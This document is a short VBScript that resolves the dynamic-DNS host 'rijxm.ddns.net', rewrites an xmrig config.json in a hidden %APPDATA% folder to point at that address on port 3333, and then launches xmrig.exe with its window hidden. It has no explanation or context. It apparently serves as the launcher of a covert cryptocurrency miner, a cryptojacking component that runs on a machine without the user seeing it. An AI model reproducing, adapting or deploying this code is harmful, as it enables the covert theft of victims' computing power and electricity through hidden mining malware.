' Define variables
host = "rijxm.ddns.net"
configFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\config.json")
xmrigPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\xmrig.exe")

Set wshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Resolve the IP address of the host
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colPing = objWMIService.ExecQuery("SELECT * FROM Win32_PingStatus WHERE Address = '" & host & "'")

ipAddress = ""
For Each objStatus in colPing
    If objStatus.StatusCode = 0 Then
        ipAddress = objStatus.ProtocolAddress
        Exit For
    End If
Next

' Check if IP address was found
If ipAddress = "" Then
    WScript.Echo "Failed to resolve IP address for host: " & host
    WScript.Quit
End If

' Update config.json with the detected IP address
If fso.FileExists(configFilePath) Then
    Set configFile = fso.OpenTextFile(configFilePath, 1)
    configText = configFile.ReadAll
    configFile.Close

    ' Replace the "url" field with the new IP address
    Set regExp = New RegExp
    regExp.Global = False
    regExp.IgnoreCase = True
    regExp.Pattern = """url"":\s*""[^""]*:\d+"""

    ' Construct the replacement string with the resolved IP address and port
    replacement = """url"": """ & ipAddress & ":3333"""

    updatedText = regExp.Replace(configText, replacement)

    ' Write the updated content back to config.json
    Set configFile = fso.OpenTextFile(configFilePath, 2)
    configFile.Write updatedText
    configFile.Close
Else
    WScript.Echo "Error: config.json not found in %APPDATA%\MyFolderM"
    WScript.Quit
End If

' Wait for 5 seconds
WScript.Sleep 5000

' Launch xmrig.exe
If fso.FileExists(xmrigPath) Then
    wshShell.Run """" & xmrigPath & """", 0, False
Else
    WScript.Echo "Error: xmrig.exe not found in %APPDATA%\MyFolderM"
    WScript.Quit
End If
